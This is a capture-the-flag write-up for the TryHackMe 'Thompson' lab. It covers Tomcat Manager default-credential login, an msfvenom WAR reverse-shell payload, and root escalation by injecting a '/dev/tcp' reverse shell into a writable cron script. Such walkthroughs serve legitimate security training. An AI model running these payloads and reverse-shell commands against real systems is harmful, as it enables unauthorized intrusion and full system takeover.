TryHackMe: Thompson – Write-Up
Room: Thompson
Link: https://tryhackme.com/room/bsidesgtthompson
Difficulty: Easy
Tags: Tomcat, WAR exploitation, Reverse shell, Privilege escalation, Cronjob vulnerability

Table of Contents
Introduction

Reconnaissance

Discovery – Tomcat Manager and Credentials

Exploiting WAR File Upload

Gaining User Shell

Privilege Escalation via Cronjob Injection

Capturing Flags

Screenshots

Tools Used

References

1. Introduction
This room involves exploiting an Apache Tomcat instance to gain an initial foothold, followed by privilege escalation via a misconfigured cron job. This write-up details the step-by-step approach, commands used, and supporting screenshots.

2. Reconnaissance
Step 1: Nmap Scan
bash
Copy
Edit
nmap -A <TARGET_IP>
Results showed:

Open HTTP port running Apache Tomcat

Service details revealed Tomcat default endpoints

Step 2: Dirbuster Scan
Ran Dirbuster against the HTTP endpoint.

Found:

/docs

/examples

/manager (Tomcat Manager login page)

3. Discovery – Tomcat Manager and Credentials
Navigating to /manager revealed a login panel.

Tried admin:admin → failed

Found valid credentials:

makefile
Copy
Edit
Username: tomcat
Password: s3cret
Logged in successfully to the Web Application Manager.

4. Exploiting WAR File Upload
Tomcat Manager allows deployment of .war files.

Generate a malicious WAR reverse shell:

bash
Copy
Edit
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4545 -f war > reverse.war

Set up a netcat listener:

bash
Copy
Edit
nc -lvnp 4545
Upload reverse.war via the Tomcat UI:

5. Gaining User Shell
Triggering the payload at:

perl
Copy
Edit
http://<TARGET_IP>:8080/reverse/
gave a reverse shell as tomcat.

Spawn a TTY shell:

bash
Copy
Edit
python -c 'import pty; pty.spawn("/bin/sh")'

Captured the user.txt flag.

6. Privilege Escalation via Cronjob Injection
Checking /etc/crontab revealed a writable script executed by root:

bash
Copy
Edit
ls -l /root/id.sh
Writable by our user → we inject a reverse shell:

bash
Copy
Edit
echo 'bash -i >& /dev/tcp/<YOUR_IP>/7676 0>&1' > /root/id.sh
Set up listener:

bash
Copy
Edit
nc -lvnp 7676
When the cronjob ran, we got a root shell.

7. Capturing Flags
User Flag:

bash
Copy
Edit
cat /home/<user>/user.txt
Root Flag:

bash
Copy
Edit
cat /root/root.txt

8. Screenshots
All screenshots are stored in /screenshots/ and linked throughout this document.

9. Tools Used
nmap – Port and service scanning

Dirbuster – Directory brute-forcing

msfvenom – Generate WAR reverse shell

netcat – Listening for shells

python – Spawn TTY shells

Apache Tomcat Manager – WAR deployment

10. References
TryHackMe: Thompson

GTFOBins

Apache Tomcat WAR Exploitation